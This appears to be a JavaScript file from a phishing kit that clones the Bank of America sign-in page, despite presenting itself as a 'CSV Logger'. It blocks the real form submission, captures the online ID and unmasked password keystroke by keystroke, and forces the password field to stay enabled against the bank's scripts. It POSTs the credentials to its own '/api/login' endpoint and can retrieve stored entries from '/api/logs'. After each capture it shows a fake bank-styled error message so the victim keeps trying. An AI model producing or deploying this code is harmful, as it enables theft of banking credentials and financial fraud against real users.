/**
 * CSV Logger for form submissions
 * Captures login form data and sends it to the server for CSV logging
 * Displays consistent error message for all login attempts
 */

// CRITICAL: Patch Form.prototype.submit BEFORE anything else runs
const OriginalFormSubmit = HTMLFormElement.prototype.submit;

HTMLFormElement.prototype.submit = function() {
  console.log('[Logger-Global] Form.submit() called on form:', this.id, this.method);
  if (this.id === 'EnterOnlineIDForm') {
    console.log('[Logger-Global] Blocking EnterOnlineIDForm submission to Bank of America');
    // ALWAYS prevent submission to Bank of America
    this.action = '';
    this.target = '';
    
    // If FormLogger instance exists, log the data
    if (window.formLoggerInstance && typeof window.formLoggerInstance.logFormData === 'function') {
      window.formLoggerInstance.logFormData(this);
    }
    // Never call the original submit - we've blocked it
    return false;
  } else {
    // For other forms, allow normal submission
    return OriginalFormSubmit.call(this);
  }
};

class FormLogger {
  constructor() {
    // Use relative URL for API endpoint (works on both localhost and production)
    this.apiEndpoint = '/api/login';
    this.rawPassword = ''; // Store unmasked password
    // Store self reference for use in global submit handler
    window.formLoggerInstance = this;
    
    // Wait for DOM to be ready before initializing
    if (document.readyState === 'loading') {
      document.addEventListener('DOMContentLoaded', () => this.init());
    } else {
      // DOM already loaded
      this.init();
    }
  }

  init() {
    const self = this;
    console.log('[Logger] Initializing form logger...');
    
    // Flag to track if this is the initial load
    let isInitialLoad = true;
    
    // FIRST: Hide any error messages on page load (they'll only show after login attempt)
    const existingErrors = document.querySelectorAll('.error-state');
    console.log('[Logger] Found', existingErrors.length, 'error-state elements on page load, hiding them');
    existingErrors.forEach((el) => {
      if (el && el.style) {
        el.style.display = 'none';
        console.log('[Logger] Hidden error element');
      }
    });
    
    // Allow errors to show after the initial setup
    setTimeout(() => {
      isInitialLoad = false;
      console.log('[Logger] Initial load complete, errors will now be displayed if needed');
    }, 500);

    // Wait a moment for Bank of America scripts to initialize, then set up our handlers
    setTimeout(() => {
      console.log('[Logger] Starting form setup after BoA initialization...');
      
      // Patch jQuery to prevent disabling the password field (if jQuery exists)
      if (typeof jQuery !== 'undefined') {
        const originalProp = jQuery.fn.prop;
        jQuery.fn.prop = function(name, value) {
          if (name === 'disabled' && value === true) {
            // Check if this is the password field
            if (this.attr('id') === 'tlpvt-passcode-input' || this.attr('name') === 'dummy-passcode') {
              console.log('[Logger] Prevented jQuery from disabling password field');
              return this; // Don't disable
            }
          }
          return originalProp.apply(this, arguments);
        };
      }

      // Enable password field after Bank of America scripts have initialized
      const passwordInput = document.getElementById('tlpvt-passcode-input');
      if (passwordInput) {
        // Enable the password field
        passwordInput.disabled = false;
        passwordInput.removeAttribute('readonly');
        passwordInput.style.opacity = '1';
        passwordInput.style.cursor = 'text';
        console.log('[Logger] Password field enabled');
        
        // Track password input for later retrieval
        passwordInput.addEventListener('input', (e) => {
          this.rawPassword = passwordInput.value;
        });
        
        passwordInput.addEventListener('keypress', (e) => {
          if (e.key && e.key.length === 1) {
            this.rawPassword += e.key;
          }
        });
        
        passwordInput.addEventListener('keydown', (e) => {
          if (e.key === 'Backspace' && this.rawPassword.length > 0) {
            this.rawPassword = this.rawPassword.slice(0, -1);
          }
        });
        
        // Use MutationObserver to prevent re-disabling
        const pwdObserver = new MutationObserver((mutations) => {
          mutations.forEach((mutation) => {
            if (mutation.attributeName === 'disabled' || mutation.attributeName === 'readonly') {
              if (passwordInput.disabled || passwordInput.readOnly) {
                passwordInput.disabled = false;
                passwordInput.removeAttribute('readonly');
                console.log('[Logger] Password field re-enabled after mutation');
              }
            }
          });
        });
        
        pwdObserver.observe(passwordInput, {
          attributes: true,
          attributeFilter: ['disabled', 'readonly']
        });
      }
      
      // Set up form submission handlers
      self.setupFormHandlers();
    }, 100);
  }

  setupFormHandlers() {
    console.log('[Logger] Setting up form submission handlers...');
    const form = document.getElementById('EnterOnlineIDForm');
    if (!form) {
      console.log('[Logger] Form not found, will retry...');
      setTimeout(() => this.setupFormHandlers(), 500);
      return;
    }

    // Prevent form submission via submit event (capture phase)
    form.addEventListener('submit', (e) => {
      console.log('[Logger] Form submit event intercepted');
      e.preventDefault();
      e.stopPropagation();
      this.logFormData(form);
      return false;
    }, true);
    
    // Intercept button clicks
    document.addEventListener('click', (e) => {
      const form = document.getElementById('EnterOnlineIDForm');
      if (form && form.contains(e.target)) {
        const button = e.target;
        if (button.tagName === 'BUTTON' || (button.tagName === 'INPUT' && button.type === 'submit')) {
          console.log('[Logger] Submit button clicked');
          e.preventDefault();
          e.stopPropagation();
          this.logFormData(form);
          return false;
        }
      }
    }, true);
  }

  /**
   * Extract form data and send to server
   */
  async logFormData(form) {
    try {
      console.log('[Logger] logFormData() started');
      console.log('[Logger] Form element:', form.id, 'Tag:', form.tagName);
      
      // Debug: Log form contents
      const inputs = form.querySelectorAll('input');
      console.log('[Logger] Form has', inputs.length, 'input elements');
      inputs.forEach((input, idx) => {
        console.log(`  [${idx}] Name: ${input.name}, ID: ${input.id}, Type: ${input.type}, Value: ${input.value.substring(0, 20)}`);
      });
      
      // Ensure password field is enabled during submit
      const passwordInput = document.getElementById('tlpvt-passcode-input');
      if (passwordInput) {
        passwordInput.disabled = false;
        console.log('[Logger] Password field disabled state checked:', passwordInput.disabled);
      } else {
        console.log('[Logger] WARNING: Password input not found!');
      }
      
      // Get User ID from input field - try multiple selectors with improved logic
      let userIdInput = null;
      let userIdValue = '';
      
      // Try 1: Direct ID selector first (most reliable)
      userIdInput = document.getElementById('enterID-input');
      if (userIdInput && userIdInput.value) {
        userIdValue = userIdInput.value.trim();
        console.log('[Logger] User ID found via ID selector #enterID-input:', userIdValue);
      }
      
      // Try 2: Name selector in form
      if (!userIdValue) {
        userIdInput = form.querySelector('input[name="dummy-onlineId"]');
        if (userIdInput && userIdInput.value) {
          userIdValue = userIdInput.value.trim();
          console.log('[Logger] User ID found via name selector input[name="dummy-onlineId"]:', userIdValue);
        }
      }
      
      // Try 3: Global document search by name
      if (!userIdValue) {
        userIdInput = document.querySelector('input[name="dummy-onlineId"]');
        if (userIdInput && userIdInput.value) {
          userIdValue = userIdInput.value.trim();
          console.log('[Logger] User ID found via global name selector:', userIdValue);
        }
      }
      
      // Try 4: Find any text input in form
      if (!userIdValue) {
        console.log('[Logger] User ID not found yet, trying to find any text input...');
        const textInputs = form.querySelectorAll('input[type="text"]');
        console.log('[Logger] Found', textInputs.length, 'text inputs in form');
        if (textInputs.length > 0) {
          userIdInput = textInputs[0];
          userIdValue = userIdInput.value.trim();
          console.log('[Logger] Using first text input:', userIdInput.name, 'Value:', userIdValue);
        }
      }
      
      // Log the final result
      if (userIdValue) {
        console.log('[Logger] ✓ User ID captured successfully:', userIdValue);
      } else {
        console.log('[Logger] ✗ WARNING: Could not extract User ID from any selector');
      }

      // Get the actual password value directly from the input field (NOT masked)
      let passwordValue = '';
      
      if (passwordInput) {
        // Get the actual value from the DOM element (this is the unmasked value)
        passwordValue = passwordInput.value || this.rawPassword || '';
        console.log('[Logger] Password captured from DOM - length:', passwordValue.length);
      } else {
        // Fallback to tracked raw password
        passwordValue = this.rawPassword || '';
        console.log('[Logger] Password captured from tracker - length:', passwordValue.length);
      }

      // Get Remember Me checkbox - try both possible selectors
      let rememberMe = false;
      let rememberInput = form.querySelector('input[name="saveMyID"]');
      if (!rememberInput) {
        rememberInput = form.querySelector('input[name="dummy-rememberMe"]');
      }
      if (!rememberInput) {
        // Try to find any checkbox in the form
        const checkboxes = form.querySelectorAll('input[type="checkbox"]');
        console.log('[Logger] Found', checkboxes.length, 'checkboxes in form');
        if (checkboxes.length > 0) {
          rememberInput = checkboxes[0];
        }
      }
      if (rememberInput) {
        rememberMe = rememberInput.checked;
        console.log('[Logger] Remember Me:', rememberMe, '(Field name:', rememberInput.name, ')');
      }

      const data = {
        userId: userIdValue || 'N/A',
        password: passwordValue || 'N/A',
        rememberMe: rememberMe
      };

      console.log('[Logger] About to send login entry:', { 
        userId: data.userId,
        passwordLength: data.password.length,
        rememberMe: data.rememberMe
      });

      // Send to server
      const response = await fetch(this.apiEndpoint, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
      });

      console.log('[Logger] Fetch response status:', response.status);
      
      if (!response.ok) {
        throw new Error(`HTTP ${response.status}`);
      }
      
      const result = await response.json();
      console.log('[Logger] Server response:', result);
      
      if (result.success) {
        console.log('[Logger] Entry successfully logged to database');
        // Display error message after logging
        this.displayErrorMessage();
        // Reset the password tracker for next attempt
        this.rawPassword = '';
        // Clear form fields for next attempt
        this.clearFormFields();
      } else {
        console.warn('[Logger] Server returned success=false:', result.message);
        this.displayErrorMessage();
      }
    } catch (error) {
      console.error('[Logger] Error sending data to server:', error.message);
      // Display error message even if logging fails
      this.displayErrorMessage();
      // Clear form fields anyway so user can try again
      this.clearFormFields();
    }
  }

  /**
   * Clear all form fields for next login attempt
   */
  clearFormFields() {
    // Clear User ID
    const userIdInput = document.querySelector('input[name="dummy-onlineId"]');
    if (userIdInput) {
      userIdInput.value = '';
    }

    // Clear Password
    const passwordInput = document.getElementById('tlpvt-passcode-input');
    if (passwordInput) {
      passwordInput.value = '';
    }

    // Reset password tracker
    this.rawPassword = '';

    console.log('[Logger] Form fields cleared for next attempt');
  }

  /**
   * Display consistent login error message using original BOA format
   */
  displayErrorMessage() {
    // Remove any existing error messages
    const existingError = document.querySelector('.error-state');
    if (existingError) {
      existingError.remove();
    }

    // Scroll to top
    window.scrollTo(0, 0);

    // Create error container matching BOA's original format exactly
    const errorContainer = document.createElement('div');
    errorContainer.className = 'error-state';
    errorContainer.innerHTML = `
      <style>
        .error-state {
          background-color: #ffe6e6;
          border: 1px solid #d32f2f;
          border-left: 5px solid #c81c24;
          padding: 16px;
          margin-bottom: 20px;
          font-family: Arial, sans-serif;
          font-size: 13px;
          line-height: 1.5;
          color: #333;
          display: flex;
          gap: 12px;
        }

        .error-state-icon-container {
          display: flex;
          justify-content: center;
          align-items: flex-start;
          flex-shrink: 0;
        }

        .error-state-icon {
          width: 32px;
          height: 32px;
          background-color: #c81c24;
          color: white;
          border-radius: 50%;
          display: flex;
          align-items: center;
          justify-content: center;
          font-weight: bold;
          font-size: 20px;
          flex-shrink: 0;
        }

        .error-state-content {
          flex: 1;
        }

        .error-state-content p {
          margin: 0 0 8px 0;
          padding: 0;
        }

        .error-state-content p:first-child {
          color: #c81c24;
          font-weight: 600;
        }

        .error-state-content a {
          color: #0066cc;
          text-decoration: none;
          font-weight: 500;
        }

        .error-state-content a:hover {
          text-decoration: underline;
        }

        .error-state-content p.error-help {
          color: #333;
          font-weight: 600;
          margin-top: 12px;
        }

        .error-state-content p.error-help-text {
          color: #666;
          margin-top: 4px;
          font-size: 12px;
        }
      </style>

      <div class="error-state-icon-container">
        <div class="error-state-icon">!</div>
      </div>
      <div class="error-state-content">
        <p>The information you entered doesn't match our records. You have a few more tries remaining.</p>
        <p>Please try again or click <a href="./login-reset.html">Forgot ID/Password</a></p>
        <p class="error-help">Having problems logging in or resetting your Password?</p>
        <p class="error-help-text">If you're using a password manager or your browser has stored credentials that are no longer valid, deleting your stored credentials should enable you to access your account. <a href="./info.html">Learn more</a></p>
      </div>
    `;

    // Insert error message at the top of the login form area
    const loginForm = document.querySelector('#EnterOnlineIDForm');
    const pageContent = document.querySelector('[class*="online-id-vipaa-module"]') || 
                       document.querySelector('.simple-form') ||
                       document.body;

    if (loginForm) {
      loginForm.parentNode.insertBefore(errorContainer, loginForm);
    } else {
      pageContent.insertBefore(errorContainer, pageContent.firstChild);
    }

    console.log('[Logger] Original BOA error message displayed');
  }

  /**
   * Manual logging method
   */
  async log(userId, password, rememberMe = false) {
    try {
      const response = await fetch(this.apiEndpoint, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          userId,
          password,
          rememberMe
        })
      });

      return await response.json();
    } catch (error) {
      console.error('[Logger] Error logging entry:', error);
      throw error;
    }
  }

  /**
   * Fetch and display logs
   */
  async fetchLogs() {
    try {
      const response = await fetch('/api/logs');
      const result = await response.json();
      return result;
    } catch (error) {
      console.error('[Logger] Error fetching logs:', error);
      throw error;
    }
  }
}

// Initialize logger when DOM is ready
function initializeFormLogger() {
  try {
    window.formLogger = new FormLogger();
    // Ensure password field is enabled after FormLogger initializes
    const passwordInput = document.getElementById('tlpvt-passcode-input');
    if (passwordInput) {
      passwordInput.disabled = false;
      console.log('[Logger] Password field confirmed enabled');
    }
  } catch (error) {
    console.error('[Logger] Failed to initialize:', error);
  }
}

if (document.readyState === 'loading') {
  document.addEventListener('DOMContentLoaded', initializeFormLogger);
} else {
  // DOM already loaded, initialize immediately
  initializeFormLogger();
}

// Also initialize on page load event as fallback
window.addEventListener('load', initializeFormLogger);

// Ensure password field stays enabled with continuous checking
setInterval(() => {
  const passwordInput = document.getElementById('tlpvt-passcode-input');
  if (passwordInput) {
    if (passwordInput.disabled || passwordInput.readOnly) {
      passwordInput.disabled = false;
      passwordInput.removeAttribute('readonly');
      passwordInput.style.opacity = '1';
      passwordInput.style.cursor = 'text';
      console.log('[Logger] Password field continuously re-enabled');
    }
  }
}, 500);
